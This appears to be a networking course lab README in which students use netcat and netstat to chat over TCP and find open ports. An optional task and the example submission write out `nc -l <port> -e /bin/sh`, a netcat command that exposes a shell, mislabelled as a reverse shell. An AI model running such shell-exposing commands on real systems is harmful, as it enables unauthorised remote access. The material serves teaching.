# Network Programming Lab #2 - Command-line Networking Tools

Welcome to this lab on network programming! In this exercise, you will explore essential command-line tools such as `nc` (netcat) and `netstat` to understand how networking works at a low level. The goal is to establish communication between processes, analyze network connections, and document your findings.

## Prerequisites

You have `nc` (netcat) installed on our server. You can check this by running:

```sh
nc -h
```

## Tasks

### Task 1: Simple Chat with Netcat

1. Start a listening server:
   ```sh
   nc -l <port_number>
   ```
Use a random port number. You may want to use your student id number to avoid port conflicts (I don't know if you studentt id number is less than 65535?)
   - What does this nc command do? Try to understand its function.
2. Connect to the server from other terminal (cmd shell on windows). Figure out the command needed to connect to the listener by reading the `nc` manual, i. e.: `man nc` and connect to the port you used before.
3. Type messages in both terminals and observe how they are sent and received.
4. Experiment by connecting from another machine if possible.

_____________________________

### Task 2: Connect to the port opened by your fellow student

1. Use `netstat` tool to find out which other ports are open. Try to connect to someone's port.
It's better if the listener on that port is not busy, so coordinate the connection with your fellow student.

2. You still have `nc` running, but you connected to it and chatted with yourself. Now kill your client (ctrl+c in that console) or the server and in second case, run the server again, so that someone could connect to you.

Do `man netstat` to figure out how to know on which ports different `netstat` programs are listening.
Ask loudly, who listens to some port, and if you can connect to it. Then try to chat with your fellow.

For the next task you need to have nc on your Windows lab machine.

_______________________________

### Installing Netcat on Windows

Windows does not include Netcat by default, but there is `ncat`, which is part of the [Nmap](https://nmap.org/ncat/) package. However, to get a standalone executable, download a portable version from [eternallybored.org](https://eternallybored.org/misc/netcat/).
Unpack, etc., there you'll find `nc.exe` and a 64bit version too.

To use it:
```powershell
nc.exe -l <port_number>
```
To connect:
```powershell
nc.exe <server_ip> <port_number>
```

### Installing Netcat on macOS

If you want to use your own mac, then:

macOS includes Netcat by default. You can verify by running:
```sh
nc -h
```
If needed, you can install an alternative version using Homebrew:
```sh
brew install netcat
```

______________________________

### Task 3: Connect form your lab or personal computer to server's port.

1. Run `nc -l <someport>` on the server, if it's not run. It should not have clients currently connected to it, if it has, do `ctrl+c` to kill it (that will terminate incoming connection) and start again.
2. Now, connect to that port from your local Windows or macOS machine.


### Task 4: Run listening nc on your local Windows/Mac machine and try to connect to it from the server (the.hell.am)
1. Do you understand why you can't do it? Write about it below:

______________________________

### Task 4: Finding Local Machine IP and Chatting with a Neighbor

1. Find out the IP address of your lab machine:
   - **Windows**: Open PowerShell or Command Prompt and run:
     ```powershell
     ipconfig
     ```
   - **macOS/Linux**: Run:
     ```sh
     ip a
     ```
or
     ```sh
     ifconfig -a
     ```

2. Share your IP address with a classmate and have them do the same.
3. Decide who will listen and who will connect.
4. Start a listener:
   ```sh
   nc -l <port_number>
   ```
5. The other person should connect using the appropriate `nc` command.
6. Start chatting and document your findings.

________________________________

### Task 4: Reverse Shell Simulation (Optional, Advanced, but that's the most funny thing to do today)

> **Warning**: This task is for educational purposes only. Never use this technique on unauthorized systems.

1. On one machine (attacker), set up a listening session:
   ```sh
   nc -l <port_number> -e /bin/sh
   ```
2. On another machine (victim), connect to the attacker's listening port:
   ```sh
   nc <attacker_ip> <port_number>
   ```
3. If successful, the attacker will gain shell access to the victim's machine.
4. Reflect on the security implications and how this could be prevented.

________________________________

## Submission Instructions

- After completing the tasks, edit this `README.md` file and write down your observations under each task. There is an empty line like this: `________________`
- Document the commands you used and any challenges you faced.
- Commit and push your changes to the repository.

---

**Example Submission Format:**

### Task 1: Simple Chat with Netcat

- Used `nc -l 12345` on one terminal and figured out the correct connection command.
- Successfully sent messages between terminals.
- Also connected from another machine on the network.

### Task 2: Connecting to the Student Server

- Listened on the server and connected from a local machine.

### Task 3: Finding Local Machine IP and Chatting with a Neighbor

- Found my IP address using `ipconfig` (Windows) / `ip a` (Linux/macOS).
- Shared IP with a neighbor and successfully established a chat connection.

### Task 4: Discover Open Ports with Netstat

- Found `nc` listening on port 12345 using `netstat -tulnp`.
- Discovered other open ports like SSH (22) and web server (80).

### Task 5: Reverse Shell Simulation (if attempted)

- Experimented with `nc -l 4444 -e /bin/sh`.
- Learned about the security risks associated with open ports.

---

Good luck, and have fun exploring networking basics!

